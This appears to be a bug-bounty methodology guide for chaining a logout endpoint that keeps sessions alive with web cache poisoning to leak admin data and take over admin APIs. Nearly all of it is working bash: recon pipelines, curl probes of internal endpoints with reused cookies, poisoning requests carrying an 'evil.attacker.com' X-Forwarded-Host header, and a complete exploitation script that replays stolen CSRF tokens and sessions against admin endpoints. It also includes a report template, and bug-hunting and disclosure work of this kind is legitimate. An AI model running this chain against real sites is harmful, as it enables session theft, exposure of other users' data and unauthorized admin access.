#  Logout → Cache Poisoning → Admin Access Methodology

## 1. Auth Endpoint Recon (The Boring Filter)

```bash
# Standard recon
subfinder -d target.com -all | httpx -silent > live.txt
katana -list live.txt -jc -kf -fx > urls.txt

# Filter ONLY auth flows (99% skip this)
grep -Ei "logout|signout|invalidate|session|revoke|auth" urls.txt > auth_flows.txt
```

**Goal:** Find `/auth/logout`, `/session/invalidate`, etc.

## 2. Test Logout Session Destruction

```bash
# 1. Capture normal logout
curl -c cookies.txt -b cookies.txt \
  "https://app.target.com/auth/logout?continue=/dashboard"

# 2. Reuse SAME cookie immediately
curl -b cookies.txt \
  "https://app.target.com/api/internal/user/profile" | jq .
```

**Red flags:**
- Session cookie still valid post-logout
- Redirect works but auth persists
- No `Set-Cookie: session=; expires=past`

## 3. Map Internal APIs (Post-Logout Accessible)

```bash
# From recon, probe undocumented endpoints
endpoints=(
  "/api/internal/session/status"
  "/api/internal/user/profile" 
  "/api/admin/users"
  "/api/debug/info"
)

for endpoint in "${endpoints[@]}"; do
  echo "[+] $endpoint"
  curl -k -b cookies.txt "https://app.target.com$endpoint" | jq .
done
```

**Target:** Endpoints returning session metadata, user roles, CSRF tokens.

## 4. Cache Header Fingerprinting

```bash
#!/bin/bash
# cache_recon.sh
curl -I -b cookies.txt "https://app.target.com/auth/logout?continue=/api/internal/session/status" | grep -Ei "cache-control|vary"
```

**Poisoning indicators:**
```
Cache-Control: public, max-age=300
Vary: X-Forwarded-Host, X-Forwarded-For
```

## 5. Weaponize Logout Cache Poisoning

```bash
# Critical: Poison logout → internal API redirect
curl -c cookies.txt -b cookies.txt \
  -H "X-Forwarded-Host: evil.attacker.com" \
  -H "X-Forwarded-For: 127.0.0.1" \
  "https://app.target.com/auth/logout?continue=/api/internal/session/status"
```

**What happens:**
1. Cache stores poisoned redirect response
2. `Vary: X-Forwarded-Host` fingerprints by attacker header
3. Victims hitting logout get internal API response

## 6. Verify Cache Poison Success

```bash
# Victim simulation (different IP/session)
curl -H "X-Forwarded-Host: evil.attacker.com" \
  "https://app.target.com/auth/logout" | jq .
```

**Success = leaked data:**
```json
{
  "user_id": 8421,
  "email": "admin@target.com", 
  "role": "admin",
  "csrf": "eYJhbGciOi..."
}
```

## 7. Admin Escalation Chain

```bash
# Extracted from poisoned cache
CSRF_TOKEN="eYJhbGciOi..."
ADMIN_SESSION="stolen_session_cookie"

# Full admin access
curl -H "Authorization: Bearer $CSRF_TOKEN" \
  "https://app.target.com/api/admin/users" | jq .

curl -b "session=$ADMIN_SESSION" \
  "https://app.target.com/api/admin/audit-logs" | jq .
```

## 8. Complete Exploitation Script

```bash
#!/bin/bash
# logout_to_admin.sh

echo "🚪 Phase 1: Poison Cache"
curl -H "X-Forwarded-Host: evil.attacker.com" \
  "https://app.target.com/auth/logout?continue=/api/internal/session/status"

echo "🧪 Phase 2: Victim Trigger (cached poison)"
curl -H "X-Forwarded-Host: evil.attacker.com" \
  "https://app.target.com/auth/logout" | jq .

echo "👑 Phase 3: Admin Access"
curl -H "Authorization: Bearer STOLEN_CSRF" \
  "https://app.target.com/api/admin/users"
```

## 9. Impact Validation Checklist

- [ ] Logout doesn't invalidate session
- [ ] Cacheable logout endpoint exists
- [ ] `Vary: X-Forwarded-*` misconfig
- [ ] Internal API accessible post-logout
- [ ] Admin data leaked via cache
- [ ] CSRF/session tokens extractable
- [ ] Admin panel fully accessible

## Pro Hunting Workflow

```
1. grep auth flows from ALL recon (not just login)
2. Test session destruction on EVERY logout variant
3. Check Cache-Control/Vary on ALL auth redirects
4. Chain with internal APIs (session/status/debug)
5. Weaponize X-Forwarded-* poisoning
6. Video: normal flow → poison → victim → admin
```

## Report Template

```
Title: Logout Cache Poisoning → Admin Data Exposure → Full Access
Severity: Critical (Auth Bypass + Info Disclosure)

Impact:
- All users clicking logout get admin data
- CSRF tokens for account takeover  
- Admin panel access via stolen sessions
- Affects ALL proxied traffic

Steps:
1. Logout cacheable + Vary: X-Forwarded-Host
2. Poison with internal API redirect  
3. Victims receive admin session data
4. Extract CSRF → admin API access

PoC: [video + script]
```

## One-Liner Recon Command

```bash
subfinder -d target.com -silent | httpx | katana -jc -kf | grep -Ei "logout|signout" | httpx -status-code | grep -v "401|403"
```

***
